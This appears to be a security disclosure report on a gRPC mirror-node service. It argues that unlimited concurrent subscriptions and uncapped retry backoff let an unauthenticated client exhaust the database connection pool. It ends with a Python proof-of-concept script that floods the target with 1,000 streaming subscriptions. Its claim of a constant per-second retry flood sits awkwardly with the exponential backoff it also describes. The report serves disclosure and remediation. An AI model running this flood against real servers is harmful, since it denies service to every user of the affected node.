### Title
Unbounded Concurrent Subscriptions Enable DB Connection Exhaustion via Infinite Retry Storm During Network Partition

### Summary
`PollingTopicMessageRetriever.retrieve()` applies `retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))` independently per subscription with no global cap on concurrent subscriptions. `TopicMessageServiceImpl` tracks `subscriberCount` only as a metrics gauge with no enforcement gate. An unprivileged attacker can open N×5 concurrent subscriptions (N TCP connections × 5 calls/connection) and, during a DB network partition, generate a sustained flood of DB reconnection attempts that exhausts the R2DBC connection pool and delays or prevents DB recovery.

### Finding Description

**Exact code path:**

`PollingTopicMessageRetriever.retrieve()` — `grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java`, lines 45–62:

```java
return Flux.defer(() -> poll(context))
    .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
        .jitter(0.1)
        .withFixedDelay(context.getFrequency())
        .withScheduler(scheduler))
    .name(METRIC)
    .tap(Micrometer.observation(observationRegistry))
    .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))   // ← no maxBackoff cap
    .timeout(retrieverProperties.getTimeout(), scheduler)              // ← 60s default
    ...
```

`TopicMessageServiceImpl.subscribeTopic()` — `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 48–91:

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);  // metrics only, never enforced
...
return topicExists(filter)
    .thenMany(flux
        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
        .doFinally(s -> subscriberCount.decrementAndGet())   // no max check before increment
        ...);
```

**Root cause:** `subscriberCount` is registered as a Micrometer `Gauge` for observability only. There is no `if (subscriberCount.get() >= maxSubscribers) return Mono.error(...)` guard before accepting a new subscription. Every incoming `subscribeTopic` call unconditionally proceeds to `retrieve()`, which attaches an independent `Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1))` operator. The `Retry.backoff()` call here specifies no `maxBackoff`, so Reactor uses its default of `Duration.ofMillis(Long.MAX_VALUE)` — exponential growth without a ceiling.

**Failed assumption:** The design assumes `maxConcurrentCallsPerConnection = 5` (default) in `NettyProperties` / `GrpcConfiguration` is a sufficient global throttle. It is not — it limits calls per TCP connection, not total calls across all connections. An attacker opens M TCP connections × 5 calls each = 5M concurrent subscriptions.

**Exploit flow during a DB partition:**
1. DB becomes unreachable (network partition or induced by attacker).
2. Each active subscription's `poll()` call (`Flux.fromStream(topicMessageRepository.findByFilter(...))`) throws a reactive DB error.
3. `retryWhen(Retry.backoff(Long.MAX_VALUE, 1s))` catches the error and schedules retries: attempt 1 after ~1s, attempt 2 after ~2s, attempt 3 after ~4s, … up to ~5–6 attempts before the 60s `timeout()` fires.
4. With 5M concurrent subscriptions, the server fires 5M DB reconnection attempts in the first second, 5M more in the second second, etc.
5. The R2DBC connection pool is exhausted. When the DB partition heals, the flood of pending reconnect attempts prevents the pool from stabilizing, delaying recovery.
6. Attacker continuously opens new subscriptions as old ones time out (every 60s), maintaining sustained pressure.

### Impact Explanation

The R2DBC connection pool for the gRPC module is shared across all subscriptions. A flood of concurrent reconnection attempts during a partition exhausts pool slots, causing all legitimate subscribers to receive errors or hang. When the partition heals, the thundering-herd of retries from all active subscriptions simultaneously hitting the DB can cause the DB to reject connections or become overloaded, extending the outage beyond the partition itself. This is a denial-of-service against the database tier, affecting all users of the mirror node, not just the attacker's subscriptions.

Severity: **High** — no authentication required, directly impacts database availability, and the attack is self-sustaining (attacker just keeps connections open).

### Likelihood Explanation

Any unprivileged client with network access to port 5600 can execute this. The gRPC `subscribeTopic` RPC requires only a valid `topicId` (which is public information on a public ledger). Opening thousands of TCP connections is trivial with standard tooling (e.g., `grpc-client-cli`, custom gRPC client). The `maxConcurrentCallsPerConnection = 5` default means the attacker needs only 200 TCP connections to reach 1,000 concurrent subscriptions. This is well within the capability of a single machine. The attack is repeatable and requires no special privileges or knowledge beyond the public API schema.

### Recommendation

1. **Enforce a global subscriber cap** in `TopicMessageServiceImpl.subscribeTopic()`:
   ```java
   if (subscriberCount.get() >= grpcProperties.getMaxSubscribers()) {
       return Mono.error(new StatusRuntimeException(Status.RESOURCE_EXHAUSTED));
   }
   ```
   Add `maxSubscribers` to `GrpcProperties` with a safe default (e.g., 5000).

2. **Add a `maxBackoff` to the retriever retry spec** to bound the retry rate:
   ```java
   .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)).maxBackoff(Duration.ofSeconds(30)))
   ```

3. **Add a per-IP or per-connection subscription limit** at the Netty/gRPC interceptor layer to prevent a single client from consuming the global cap.

4. **Reduce the default `timeout`** (`hiero.mirror.grpc.retriever.timeout`, currently 60s) to a shorter value so subscriptions self-terminate faster during a partition, reducing the window of concurrent retry pressure.

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2, basic_types_pb2

TARGET = "mirror-node:5600"
TOPIC_ID = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1)
NUM_CONNECTIONS = 200  # × 5 calls/conn = 1000 concurrent subscriptions

def flood_subscribe():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(topicID=TOPIC_ID)
    # Open 5 concurrent streaming calls on this connection
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    # Keep streams alive
    for stream in streams:
        try:
            for _ in stream:
                pass
        except Exception:
            pass

# Step 1: Induce or wait for DB partition
# Step 2: Open NUM_CONNECTIONS TCP connections, each with 5 subscriptions
threads = [threading.Thread(target=flood_subscribe) for _ in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
# Result: 1000 concurrent subscriptions each firing Retry.backoff retries against the DB
# DB connection pool exhausted; legitimate subscribers receive errors
```
